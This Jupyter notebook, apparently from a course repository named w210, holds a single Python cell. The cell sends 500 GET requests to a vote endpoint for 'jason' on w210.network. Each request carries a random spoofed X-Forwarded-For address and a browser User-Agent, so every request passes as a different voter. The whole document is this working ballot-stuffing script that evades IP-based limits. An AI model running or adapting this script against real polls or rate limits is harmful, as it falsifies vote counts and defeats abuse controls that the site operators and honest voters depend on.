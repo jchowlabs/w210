{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "Z3LjkHqyt5xv"
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "import random\n",
    "import socket\n",
    "import struct\n",
    "\n",
    "for i in range(500):\n",
    "    \n",
    "    ipaddr = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))\n",
    "    url = \"http://w210.network:8102/vote/jason\"\n",
    "    headers = {\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\", \n",
    "               \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n",
    "               \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \n",
    "               \"X-Forwarded-For\": ipaddr, \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"}\n",
    "    requests.get(url, headers = headers)\n",
    "\n",
    "print(\"Completed\")"
   ]
  }
 ],
 "metadata": {
  "colab": {
   "collapsed_sections": [],
   "provenance": []
  },
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
